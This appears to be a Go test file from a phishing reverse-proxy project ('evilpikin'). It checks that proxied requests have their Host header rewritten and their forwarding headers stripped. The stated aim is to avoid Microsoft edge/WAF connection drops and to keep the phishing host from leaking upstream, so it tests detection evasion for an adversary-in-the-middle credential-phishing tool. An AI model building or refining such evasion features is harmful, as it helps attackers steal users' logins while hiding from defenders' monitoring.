package proxy

import (
	"net/http"
	"net/http/httptest"
	"net/http/httputil"
	"net/url"
	"testing"
	"time"

	"github.com/user/evilpikin/internal/storage"
)

// TestRequestModifierStripsForwardedHeaders verifies the live engine path:
// the upstream must see a rewritten Host and must NOT receive any of the
// forwarding headers that trigger Microsoft edge / WAF connection drops (EOF).
func TestRequestModifierStripsForwardedHeaders(t *testing.T) {
	var gotHost string
	var gotHeader http.Header
	done := make(chan struct{})

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotHost = r.Host
		gotHeader = r.Header.Clone()
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok"))
		close(done)
	}))
	defer srv.Close()

	u, err := url.Parse(srv.URL)
	if err != nil {
		t.Fatalf("parse upstream: %v", err)
	}

	target := &storage.TargetProfile{Origin: u.Host}

	proxy := httputil.NewSingleHostReverseProxy(u) // default Director -> URL+Host = u.Host
	proxy.Transport = &requestModifier{rt: nil, target: target}

	req := httptest.NewRequest(http.MethodGet, "http://ms.test/", nil)
	req.Host = "ms.test"
	req.Header.Set("Forwarded", "for=1.2.3.4")
	req.Header.Set("X-Forwarded-For", "1.2.3.4")
	req.Header.Set("X-Forwarded-Host", "ms.test")
	req.Header.Set("X-Forwarded-Proto", "http")

	rec := httptest.NewRecorder()
	proxy.ServeHTTP(rec, req)

	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("upstream never reached")
	}

	if gotHost != u.Host {
		t.Errorf("upstream Host = %q, want %q (phishing host must not leak)", gotHost, u.Host)
	}
	for _, h := range []string{"Forwarded", "X-Forwarded-For", "X-Forwarded-Host"} {
		if v := gotHeader.Get(h); v != "" {
			t.Errorf("upstream received %s = %q; must be stripped", h, v)
		}
	}
	if v := gotHeader.Get("X-Forwarded-Proto"); v != "https" {
		t.Errorf("X-Forwarded-Proto = %q, want https", v)
	}
}
